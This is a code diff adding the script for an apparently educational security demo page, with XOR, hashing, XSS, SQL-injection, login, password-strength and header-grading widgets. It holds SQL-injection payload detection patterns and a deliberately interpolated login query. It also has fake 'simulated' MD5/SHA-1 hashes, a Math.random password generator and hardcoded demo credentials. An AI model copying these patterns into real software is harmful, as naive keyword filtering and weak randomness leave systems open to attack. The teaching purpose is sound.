+    for(let i=0;i<Math.min(3,text.length);i++){
+      const p=text.charCodeAt(i), k=key.charCodeAt(i%key.length), r=p^k;
+      bits+=`${text[i]}(${p.toString(2).padStart(8,'0')}) ⊕ ${key[i%key.length]}(${k.toString(2).padStart(8,'0')}) = ${String.fromCharCode(r)}(${r.toString(2).padStart(8,'0')})\n`;
+    }
+    document.getElementById('xor-bits').textContent=bits;
+  } else {
+    const hexStr=text.replace(/\s/g,'');
+    const bytes=hexStr.match(/.{2}/g)||[];
+    const result=bytes.map((b,i)=>String.fromCharCode(parseInt(b,16)^key.charCodeAt(i%key.length))).join('');
+    document.getElementById('xor-out').textContent=result;
+  }
+}
+
+// ══ HASHING ════════════════════════════════════════════
+async function computeHash() {
+  const text=document.getElementById('hash-in').value||'Hello';
+  const el=document.getElementById('hash-outputs');
+  const encode=s=>new TextEncoder().encode(s);
+
+  const simMD5=s=>{let h=0;for(let i=0;i<s.length;i++){h=((h<<5)-h+s.charCodeAt(i))|0;}const v=Math.abs(h).toString(16);return (v.repeat(8)).substring(0,32);}
+  const simSHA1=s=>{let h=0;for(let i=0;i<s.length;i++){h=Math.imul(31,h)+s.charCodeAt(i);}return (Math.abs(h).toString(16)+Math.abs(h^0xDEADBEEF).toString(16)).padEnd(40,'0').substring(0,40);}
+
+  el.innerHTML='<div style="color:var(--gray);font-size:12px;margin-bottom:8px;">Computing...</div>';
+
+  let sha256='', sha512='';
+  try {
+    const buf=await crypto.subtle.digest('SHA-256',encode(text));
+    sha256=[...new Uint8Array(buf)].map(b=>b.toString(16).padStart(2,'0')).join('');
+    const buf2=await crypto.subtle.digest('SHA-512',encode(text));
+    sha512=[...new Uint8Array(buf2)].map(b=>b.toString(16).padStart(2,'0')).join('');
+  } catch(e){}
+
+  const hashes=[
+    ['MD5 (simulated)','32 hex chars',simMD5(text),'var(--red)','⚠️ BROKEN'],
+    ['SHA-1 (simulated)','40 hex chars',simSHA1(text),'var(--orange)','⚠️ DEPRECATED'],
+    ['SHA-256 (real)','64 hex chars',sha256||'(requires crypto API)','var(--green)','✅ SECURE'],
+    ['SHA-512 (real)','128 hex chars',sha512||'(requires crypto API)','var(--cyan)','✅ SECURE'],
+  ];
+  el.innerHTML=hashes.map(([name,len,hash,col,status])=>`
+    <div style="margin-bottom:12px;">
+      <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px;">
+        <span style="font-family:'Share Tech Mono',monospace;font-size:12px;color:${col};font-weight:700;">${name}</span>
+        <span style="font-size:10px;color:var(--muted);">${len}</span>
+        <span style="font-size:10px;font-weight:700;color:${status.includes('✅')?'var(--green)':'var(--orange)'};">${status}</span>
+      </div>
+      <div class="hash-output" style="border-color:${col}33;">${hash}</div>
+    </div>`).join('');
+}
+
+// ══ XSS DEMO ═══════════════════════════════════════════
+function xssDemo(mode) {
+  const input=document.getElementById('xss-in').value;
+  const out=document.getElementById('xss-output');
+  if(mode==='unsafe'){
+    out.innerHTML=`<div class="alert-crit"><span>🚨</span><div><strong>VULNERABLE OUTPUT (innerHTML):</strong><div style="margin-top:8px;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--white);background:#000;padding:10px;border-radius:4px;">[Script tag stripped by browser sandbox — in a real vulnerable app, this would execute!]</div><div style="margin-top:6px;font-size:11px;">Raw input was: <code style="color:var(--red);">${input.replace(/</g,'&lt;').replace(/>/g,'&gt;')}</code></div></div></div>`;
+    showToast('⚠️ Vulnerable render — script would execute in real app!', true);
+  } else {
+    const safe=input.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#x27;');
+    out.innerHTML=`<div class="alert-safe"><span>✅</span><div><strong>SAFE OUTPUT (textContent / escaped):</strong><div style="margin-top:8px;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--green);background:#000;padding:10px;border-radius:4px;">${safe}</div><div style="margin-top:6px;font-size:11px;">All HTML special chars escaped — script cannot execute.</div></div></div>`;
+    showToast('✅ Safe — input properly sanitized!');
+  }
+}
+
+// ══ SQL INJECTION DEMO ═════════════════════════════════
+function sqliDemo() {
+  const user=document.getElementById('sqli-user').value;
+  const pass=document.getElementById('sqli-pass').value;
+  const query=`SELECT * FROM users WHERE username='${user}' AND password='${pass}'`;
+  const isInjection=pass.includes("'")||pass.includes('--')||pass.includes(';')||pass.includes('OR')||pass.includes('UNION');
+  const bypass=pass.includes("' OR '")||pass.includes("'--")||pass.includes("OR 1=1");
+  const drop=query.toLowerCase().includes('drop table');
+  const out=document.getElementById('sqli-output');
+  let html=`<div class="code-block" style="font-size:11px;border-color:${isInjection?'rgba(255,51,85,.4)':'rgba(0,255,136,.2)'};margin-bottom:10px;"><span style="color:var(--muted)">-- Generated Query:</span>\n${query.replace(/</g,'&lt;').replace(/>/g,'&gt;')}</div>`;
+  if(drop){
+    html+=`<div class="alert-crit"><span>💀</span><div><strong>CATASTROPHIC: DROP TABLE executed!</strong><br>The users table would be permanently deleted. All user data LOST.</div></div>`;
+    showToast('💀 DROP TABLE — Database destroyed!', true);
+  } else if(bypass){
+    html+=`<div class="alert-crit"><span>🚨</span><div><strong>AUTH BYPASS SUCCESSFUL!</strong><br>The condition <code style="color:var(--red);">'1'='1'</code> is always TRUE — query returns ALL users. Attacker is now logged in as admin without knowing the password!</div></div>`;
+    showToast('🚨 SQL Injection — Auth bypassed!', true);
+  } else if(isInjection){
+    html+=`<div class="alert-warn"><span>⚠️</span><div><strong>Suspicious Input Detected.</strong><br>SQL special characters found. In a vulnerable app, this could cause errors or data leakage.</div></div>`;
+    showToast('⚠️ SQL injection attempt detected', true);
+  } else {
+    html+=`<div class="alert-safe"><span>✅</span><div><strong>Normal Login Attempt.</strong><br>Query looks safe — no injection patterns detected. In a real system, password would be compared as hash.</div></div>`;
+    showToast('✅ Normal query executed');
+  }
+  out.innerHTML=html;
+}
+
+// ══ AUTH DEMO ══════════════════════════════════════════
+function authLogin() {
+  const user=document.getElementById('auth-user').value;
+  const pass=document.getElementById('auth-pass').value;
+  const mfa=document.getElementById('auth-mfa').value;
+  const out=document.getElementById('auth-output');
+  const validUser='admin', validPass='SecureP@ss123!', validMFA='123456';
+  const sqli=pass.includes("'")||pass.includes('--')||pass.includes('OR');
+  if(sqli){
+    out.innerHTML=`<div class="alert-crit"><span>🛡️</span><div><strong>BLOCKED: SQL Injection Attempt Detected.</strong><br>Input sanitization caught malicious input. Incident logged. IP flagged.</div></div>`;
+    showToast('🛡️ SQL injection blocked!', true);
+  } else if(user!==validUser||pass!==validPass){
+    out.innerHTML=`<div class="alert-crit"><span>❌</span><div><strong>LOGIN FAILED</strong><br>Invalid credentials. This attempt has been logged. After 5 failed attempts, account will be locked for 15 minutes.</div></div>`;
+    showToast('❌ Login failed', true);
+  } else if(mfa!==validMFA){
+    out.innerHTML=`<div class="alert-warn"><span>⚠️</span><div><strong>MFA VERIFICATION FAILED</strong><br>Password correct but MFA code invalid. Access denied — MFA is mandatory for this account.</div></div>`;
+    showToast('⚠️ MFA failed', true);
+  } else {
+    const token='eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDAwMDAwMDB9.signature';
+    out.innerHTML=`<div class="alert-safe"><span>✅</span><div><strong>LOGIN SUCCESSFUL — Welcome, ${user}!</strong><br>
+      <span style="font-size:11px;color:var(--gray);">JWT Token issued: <code style="font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--green);">${token}</code><br>Expires in: 24 hours. Session logged. MFA verified ✓</span>
+    </div></div>`;
+    showToast('✅ Login successful!');
+  }
+}
+
+function checkPwdStrength(pwd) {
+  const checks=[pwd.length>=8,/[A-Z]/.test(pwd),/[a-z]/.test(pwd),/[0-9]/.test(pwd),/[^A-Za-z0-9]/.test(pwd)];
+  const score=checks.filter(Boolean).length;
+  const colors=['var(--red)','var(--red)','var(--orange)','var(--yellow)','var(--green)'];
+  const labels=['Very Weak','Weak','Fair','Strong','Very Strong'];
+  const fill=document.getElementById('pwd-fill');
+  if(fill){fill.style.width=(score*20)+'%';fill.style.background=colors[score-1]||'var(--red)';}
+  const lt=document.getElementById('pwd-strength-text');
+  if(lt) lt.textContent=labels[score-1]||'Very Weak';
+}
+
+function togglePwd(id){
+  const el=document.getElementById(id);
+  el.type=el.type==='password'?'text':'password';
+}
+
+function analyzePassword(pwd) {
+  const checks=[
+    [pwd.length>=12,'At least 12 characters','char'],
+    [/[A-Z]/.test(pwd),'Contains uppercase letter','case'],
+    [/[a-z]/.test(pwd),'Contains lowercase letter','case'],
+    [/[0-9]/.test(pwd),'Contains a number','num'],
+    [/[^A-Za-z0-9]/.test(pwd),'Contains special character (!@#$...)','sym'],
+    [!/^[a-zA-Z]+$/.test(pwd),'Not all letters','mix'],
+    [!['password','123456','qwerty','abc123'].includes(pwd.toLowerCase()),'Not a common password','common'],
+  ];
+  const score=checks.filter(c=>c[0]).length;
+  const pct=Math.round(score/checks.length*100);
+  const col=pct>=85?'var(--green)':pct>=60?'var(--yellow)':pct>=40?'var(--orange)':'var(--red)';
+  const lbl=pct>=85?'Very Strong 🛡️':pct>=60?'Strong':pct>=40?'Fair ⚠️':'Weak ❌';
+  document.getElementById('main-pwd-fill').style.width=pct+'%';
+  document.getElementById('main-pwd-fill').style.background=col;
+  document.getElementById('main-pwd-label').textContent=`${lbl} (${score}/${checks.length} criteria met)`;
+  document.getElementById('main-pwd-label').style.color=col;
+  document.getElementById('pwd-checks').innerHTML=checks.map(([pass,label])=>`<div style="display:flex;gap:8px;padding:5px 10px;border-radius:5px;margin-bottom:4px;background:var(--s2);font-size:12px;">
+    <span style="color:${pass?'var(--green)':'var(--red)'};">${pass?'✓':'✗'}</span>
+    <span style="color:${pass?'var(--white)':'var(--gray)'};">${label}</span>
+  </div>`).join('');
+  const space=95+(pwd.length>8?8:0)+(pwd.length>12?4:0);
+  const combos=Math.pow(space,pwd.length);
+  const perSec=1e10;
+  const secs=combos/perSec;
+  const crackTime=secs<1?'Instantly':secs<60?`${Math.round(secs)} seconds`:secs<3600?`${Math.round(secs/60)} minutes`:secs<86400?`${Math.round(secs/3600)} hours`:secs<31536000?`${Math.round(secs/86400)} days`:secs<31536000000?`${Math.round(secs/31536000)} years`:'Centuries (>100 years)';
+  document.getElementById('crack-time').innerHTML=`<span style="color:var(--gray)">Charset size: </span><span style="color:var(--cyan)">${space}</span>  <span style="color:var(--gray)">Combinations: </span><span style="color:var(--cyan)">${combos.toExponential(2)}</span>\n<span style="color:var(--gray)">At 10B guesses/sec: </span><span style="color:${score>=5?'var(--green)':'var(--red)'};">${crackTime}</span>`;
+}
+
+function genStrongPwd() {
+  const chars='ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789!@#$%^&*';
+  let pwd='';
+  for(let i=0;i<16;i++) pwd+=chars[Math.floor(Math.random()*chars.length)];
+  document.getElementById('gen-pwd-output').innerHTML=`<div class="cipher-output" style="cursor:pointer;user-select:all;" onclick="navigator.clipboard.writeText(this.textContent).then(()=>showToast('Password copied!'))">${pwd}</div><div style="font-size:11px;color:var(--gray);margin-top:4px;">Click to copy</div>`;
+  analyzePassword(pwd);
+}
+
+function scanHeaders() {
+  loadHeaderProfile('secure');
+}
+
+function loadHeaderProfile(type) {
+  const profiles = {
+    secure: {score:100,label:'A+',col:'var(--green)',headers:[true,true,true,true,true,true,true]},
+    partial: {score:57,label:'C',col:'var(--orange)',headers:[true,false,true,true,false,false,false]},
+    insecure: {score:0,label:'F',col:'var(--red)',headers:[false,false,false,false,false,false,false]},
+  };
+  const p=profiles[type];
+  const headerNames=['Content-Security-Policy','Strict-Transport-Security','X-Frame-Options','X-Content-Type-Options','Referrer-Policy','Permissions-Policy','X-XSS-Protection'];
+  document.getElementById('header-scan-result').innerHTML=`
+    <div style="background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:16px;">
+      <div style="display:flex;align-items:center;gap:14px;margin-bottom:12px;">
+        <div style="font-family:'Rajdhani',sans-serif;font-size:42px;font-weight:800;color:${p.col};">${p.label}</div>
+        <div><div style="font-size:14px;font-weight:700;color:${p.col};">Security Score: ${p.score}/100</div>
+          <div class="prog" style="width:200px;margin-top:5px;"><div class="prog-fill" style="width:${p.score}%;background:${p.col};"></div></div>
+        </div>
+      </div>
+      <div style="display:flex;flex-direction:column;gap:6px;">
+        ${headerNames.map((h,i)=>`<div style="display:flex;align-items:center;gap:8px;font-size:12px;">
+          <span style="color:${p.headers[i]?'var(--green)':'var(--red)'};">${p.headers[i]?'✓':'✗'}</span>
+          <span style="font-family:'Share Tech Mono',monospace;color:${p.headers[i]?'var(--white)':'var(--gray)'};">${h}</span>
+        </div>`).join('')}
+      </div>
+    </div>`;
+  showToast(`Profile loaded: ${type} (Grade: ${p.label})`);
+}
+
+// ══ INIT ═══════════════════════════════════════════════
+caesarProcess();
+buildShiftTable(3);
+</script>
+</body>
+</html>
